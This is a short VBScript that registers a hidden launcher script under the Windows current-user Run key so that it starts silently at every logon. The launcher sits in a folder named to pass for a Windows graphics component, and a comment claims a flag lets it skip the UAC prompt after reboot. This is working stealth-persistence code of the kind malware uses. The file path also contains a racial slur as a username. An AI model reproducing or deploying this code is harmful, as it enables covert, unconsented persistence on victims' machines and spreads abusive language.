Set objShell = CreateObject("WScript.Shell")

' The exact path where your files are downloaded
strVBS = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\launcher.vbs"

' The Registry "Run" key for the current user
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ForexForgeSync"

' We add /boot so the launcher knows it is a reboot and skips the UAC prompt
strRunCmd = "wscript.exe //B """ & strVBS & """ /boot"

' Save to Registry
objShell.RegWrite strRegPath, strRunCmd, "REG_SZ"

' Optional: Silent exit
WScript.Quit
